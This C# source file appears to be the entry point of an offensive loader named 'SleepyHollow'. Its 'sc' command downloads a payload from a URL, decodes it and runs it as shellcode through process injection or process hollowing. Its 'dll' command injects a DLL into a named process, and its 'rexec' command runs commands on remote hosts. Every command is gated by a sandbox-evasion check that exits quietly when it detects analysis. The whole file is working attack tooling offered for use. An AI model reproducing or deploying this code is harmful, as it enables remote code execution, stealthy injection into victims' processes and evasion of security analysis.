using SleepyHollow;
using System.CommandLine;


var payloadOption = new Option<string>(
    name: "--payload",
    description: "The file to download and execute");
payloadOption.AddAlias("-p");

var methodOption = new Option<string>(
    name: "--method",
    description: "Execution method").FromAmong("inject", "hollow");
methodOption.AddAlias("-m");

var waitOptions = new Option<int>(
    name: "--wait",
    description: "The number of seconds to wait after executing the payload");
waitOptions.AddAlias("-w");
waitOptions.SetDefaultValue(0);

var scCommand = new Command("sc", "Injects and runs shellcode"){
    payloadOption,
    methodOption,
    waitOptions
};

var dllName = new Argument<string>("path/URL to DLL", "The DLL to inject");
var processName = new Argument<string>("processName", "The process to inject into");
var dllCommand = new Command("dll", "Injects and runs DLL"){
    processName,
    dllName
};

var hostnameArg = new Argument<string>("hostname", "The hostname to connect to");
var cmdArg = new Argument<string>("cmd", "The command to execute");
var remoteExecCommand = new Command("rexec", "Executes a command on a remote host"){
    hostnameArg,
    cmdArg
};


var rootCommand = new RootCommand("SleepyHollow");
var skipEvasionOption = new Option<bool>("--skip-evasion", "Do not perform sandbox evasion checks");
var debugOption = new Option<bool>("--debug", "Enable debug logging");
rootCommand.AddGlobalOption(skipEvasionOption);
rootCommand.AddGlobalOption(debugOption);
rootCommand.AddCommand(scCommand);
rootCommand.AddCommand(dllCommand);
rootCommand.AddCommand(remoteExecCommand);

remoteExecCommand.SetHandler(async (host, cmd, skipEvasion, debug) =>
{
    if (!skipEvasion && EvasionCheck.Detected)
    {
        Console.WriteLine("Have a nice day!");
        Environment.Exit(0);
    }

    await RemoteExecution.Run(host, cmd, debug: debug);
}, hostnameArg, cmdArg, skipEvasionOption, debugOption);

scCommand.SetHandler(async (url, method, skipEvasion, debug, wait) =>
{
    if (!skipEvasion && EvasionCheck.Detected)
    {
        Console.WriteLine("Have a nice day!");
        Environment.Exit(0);
    }
    if (debug) Console.WriteLine($"Downloading {url}...");
    var httpClient = new HttpClient();
    var data = await httpClient.GetStringAsync(url);
    if (debug) Console.WriteLine($"Downloaded {data.Length} bytes");
    var buf = Decoder.DecodeString(data);
    if (debug) Console.WriteLine($"Decrypted payload to {buf.Length} bytes");
    var inject = method?.Equals("inject", StringComparison.OrdinalIgnoreCase) ?? false;
    if (inject)
        await InjectProcess.Run(buf, debug: debug);
    else
        await HollowProcess.Run(buf, debug: debug);
    await Task.Delay(wait * 1000);
}, payloadOption, methodOption, skipEvasionOption, debugOption, waitOptions);

dllCommand.SetHandler(async (processName, dllName, skipEvasion, debug) =>
{
    if (!skipEvasion && EvasionCheck.Detected)
    {
        Console.WriteLine("Have a nice day!");
        Environment.Exit(0);
    }

    await InjectDLL.Run(dllName, processName, debug);
}, processName, dllName, skipEvasionOption, debugOption);

await rootCommand.InvokeAsync(args);